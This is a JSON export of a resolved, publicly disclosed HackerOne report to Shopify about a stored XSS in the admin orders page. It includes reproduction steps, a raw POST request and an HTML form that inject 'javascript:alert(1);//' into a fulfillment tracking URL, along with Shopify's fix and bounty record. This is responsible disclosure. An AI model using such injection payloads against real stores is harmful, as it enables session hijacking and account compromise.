{"id":106897,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY4OTc=","url":"https://hackerone.com/reports/106897","title":"Stored XSS in /admin/orders ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-12-25T21:16:24.148Z","submitted_at":"2015-12-25T21:16:24.148Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-02-17T05:14:22.583Z","bug_reporter_agreed_on_going_public_at":"2016-02-17T05:14:15.874Z","team_member_agreed_on_going_public_at":"2016-02-16T23:18:38.055Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi , I have found a Stored XSS vulnerability in orders page.\n#Steps to reproduce:\n1. Create a new order with an item that requires shipping \n2. Go to `https://\u003cstore\u003e.myshopify.com/admin/orders/\u003corder_id\u003e`\n3. Click the **Fulfill items** button then fulfill the items\n4. Now a new fulfillment with an id will be generated , get the id of the fulfillment and send the following post request:\n\n```\nPOST https://\u003cyour-store\u003e.myshopify.com/admin/orders/\u003corder-id\u003e/fulfillments/\u003cfulfillment-id\u003e\nAccept:text/html, application/xhtml+xml, application/xml\nAccept-Encoding:gzip, deflate\nAccept-Language:en-US,en;q=0.8\nConnection:keep-alive\nContent-Length:380\nContent-Type:application/x-www-form-urlencoded; charset=UTF-8\nCookie: \u003ccookies\u003e\nX-CSRF Token: \u003cYOUR_TOKEN\u003e\nX-Requested-With:XMLHttpRequest\n....\n\nutf8=%E2%9C%93\u0026_method=put\u0026authenticity_token=\u003cCSRF_TOKEN\u003e\u0026fulfillment%5Btracking_numbers%5D%5B%5D=TrackingNumber\u0026fulfillment%5Btracking_urls%5D%5B%5D=javascript%3Aalert(1)%3B%2F%2F\u0026fulfillment%5Btracking_company%5D=Other\u0026fulfillment%5Bnotify_customer%5D=false\u0026fulfillment%5Bnotify_customer%5D=true\n```\n\n5.- The fulfillment will be updated , go to the order page then scroll down and click on **Successfully processed a payment** then click the link that says **TrackingNumber** and XSS will trigger.\n\n#Example Form (in case you are having trouble sending the request):\n```html\n\u003cform action=\"/admin/orders/1917753154/fulfillments/1542021826\" accept-charset=\"UTF-8\" method=\"post\"\u003e\n\u003cinput name=\"utf8\" type=\"hidden\" value=\"âœ“\"\u003e\n\u003cinput type=\"hidden\" name=\"_method\" value=\"put\"\u003e\n\u003cinput type=\"hidden\" name=\"authenticity_token\" value=\"\u003cCSRF_TOKEN\u003e\"\u003e\n\u003cinput name=\"fulfillment[tracking_urls][]\" value=\"javascript:alert(1);//\"\u003e\n\u003cinput type=\"text\" name=\"fulfillment[tracking_numbers][]\" value=\"TrackingNumber\"\u003e\n\u003cinput name=\"fulfillment[tracking_company]\" value=\"other\"\u003e\n\u003cinput type=\"hidden\" name=\"fulfillment[notify_customer]\"  value=\"true\"\u003e\n \u003cinput type=\"submit\"\u003e                    \n\u003c/form\u003e\n```\nThanks","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-03-17T23:18:38.373Z","allow_singular_disclosure_after":-175701796.164134,"singular_disclosure_allowed":true,"vote_count":2,"voters":["drsniper","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":732615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry the report title should be `Stored XSS in /admin/orders/\u003corder_id\u003e`","automated_response":false,"created_at":"2015-12-25T21:17:25.054Z","updated_at":"2015-12-25T21:17:25.054Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":732618,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Attached is screenshot where XSS triggers.","automated_response":false,"created_at":"2015-12-25T21:47:35.651Z","updated_at":"2015-12-25T21:57:15.965Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":66796,"filename":"xss-shopify.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/066/796/a33e3ccbe04caea3e4cdf6f02563c08572c6cad9/xss-shopify.png?response-content-disposition=attachment%3B%20filename%3D%22xss-shopify.png%22%3B%20filename%2A%3DUTF-8%27%27xss-shopify.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ76PP2BUX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132154Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGHP7cIwt2Tsf8KjliDyT5Lb7ly0JskiaYe2ChAX3AmbAiAqtHMw8uLFecT9g9U5UE%2FCxE1a%2BtPZJAnSYYnH2BI8piqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMzMSFx2nvHLNo5SLgKtcDcW%2FgFn8cU0mgC1%2FVdGfTPYSBsMiGZbBVEFWLz7BIkAjvx1Yl0xNwccsia5mxGh5Pof1BmLOj%2FPbfN0yxfjTbBvX%2BtxFisFe4lleD7sAfIMQHgrItYYlJlrAkcGTOF0hj5oy17q8C901VMWg1M3Oq1DUHqNUDjNiOuNs3pYI8%2F%2FpJPSaJwkT0kt%2FgzY3%2FaZ0aVY4K5doqZxp2VxJBM6CwnM47o6IbMvH%2F6hCdkC2dfUYQhPAa%2FygUp%2Fmm%2FrBM1LnDwRHK5mENZHzc9lNN77yHKCN1H3z9bi6t%2FdgHvkJFjucgPEBep99zqb1GTqjJfJh62po7%2FS6VgiubeoT%2ByWP%2FtbqeYVZAMxxgiX1mB4dTzOp9zUHuTJ5nixo2KbV6zjXbuM3CsrhUAywRCeq1ysa5sihESBZMzWy4KTeSnnVgA3YGSpb6bjYVcuyXShrdtMdh%2Bi%2Fut350eVReQuhtta9UeSQASWy1DEqou8oW6%2BWrK%2Fu8ty%2Bdy03u84XY3jIFi15g20CivixBXwDrJq5GMnahFYcvlzz%2FNfvLxBKnaZyOEiCkM%2BOhX4C4%2BLxcdNS1%2B%2FJZkMdX5isJd3PLZxJ0Za4ah4jaZUkoTXoWEByAePJ%2FcQ2oGnMS56ZNMLTgkIsGOqYBDJcz6RvFiMKVMfgvSf0yaXoPP4o%2BD%2Fa8JI%2BvkanDoFK0GH2rrIW6QMEbvg1sbDA%2B9VmM8kFxkCwfS%2F888Z5ykzUXec2dE5NYyugHVg5stjEJdkzVfFm30TsJCuULkIUdUPpiclOA72MSSbJsTlChJhjuLyQb8nARpH6iLndWaVXQjXW0hsGl9kRoYIkectIjPcMElLSYn47zPkurLskrWPNIcaHBlw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1a67fbd7de27f7a46db212e8738ff205c2d7b2b03087568e6f5229cd028d5355"}],"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":754894,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.","automated_response":false,"created_at":"2016-01-12T16:40:06.896Z","updated_at":"2016-01-12T16:40:06.896Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":783487,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. We recently fixed this issue by limiting tracking URLs to http or https.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","automated_response":false,"created_at":"2016-02-03T19:38:20.642Z","updated_at":"2016-02-03T19:38:20.642Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":800636,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify! This issue has been resolved.","automated_response":false,"created_at":"2016-02-16T23:18:30.913Z","updated_at":"2016-02-16T23:18:30.913Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"zombiehelp54","url":"/zombiehelp54"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":800637,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-02-16T23:18:38.100Z","updated_at":"2016-02-16T23:18:38.100Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":800910,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-02-17T05:14:15.899Z","updated_at":"2016-02-17T05:14:15.899Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":800911,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-02-17T05:14:22.606Z","updated_at":"2016-02-17T05:14:22.606Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}